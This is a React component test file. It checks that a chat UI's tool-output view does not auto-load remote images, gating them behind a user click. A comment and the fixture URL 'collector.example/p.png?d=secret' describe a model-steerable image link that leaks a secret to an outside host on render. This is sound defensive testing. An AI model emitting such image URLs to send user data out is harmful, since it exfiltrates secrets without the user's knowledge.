import { cleanup, fireEvent, render, screen } from '@testing-library/react'
import type { ComponentProps } from 'react'
import { afterEach, describe, expect, it, vi } from 'vitest'

vi.mock('@assistant-ui/react', async importOriginal => ({
  ...(await importOriginal<Record<string, unknown>>()),
  useAuiState: (select: (state: unknown) => unknown) =>
    select({ message: { id: 'msg-1', status: { type: 'complete' } }, thread: { isRunning: false } })
}))

const { ToolFallback } = await import('./fallback')

function renderTool(imageUrl: string) {
  const props = {
    args: {},
    result: { image_url: imageUrl },
    toolCallId: 'call-1',
    toolName: 'image_generate'
  } as unknown as ComponentProps<typeof ToolFallback>

  const view = render(<ToolFallback {...props} />)
  const toggle = view.container.querySelector('[aria-expanded="false"]')

  if (toggle) {
    fireEvent.click(toggle)
  }

  return view
}

afterEach(cleanup)

describe('tool image output', () => {
  // A tool result is model-steerable: an <img> that loads on render sends
  // `?d=<secret>` to that host with no click.
  it('does not fetch a remote image until the user asks', () => {
    const { container } = renderTool('https://collector.example/p.png?d=secret')

    expect(container.querySelector('img[src*="collector.example"]')).toBeNull()
    const gate = screen.getByRole('button', { name: /load image from collector\.example/i })

    fireEvent.click(gate)
    expect(container.querySelector('img[src*="collector.example"]')).not.toBeNull()
  })

  it('still shows an inline data image straight away', () => {
    const { container } = renderTool('data:image/png;base64,iVBORw0KGgo=')

    expect(container.querySelector('img[src^="data:image/png"]')).not.toBeNull()
  })
})
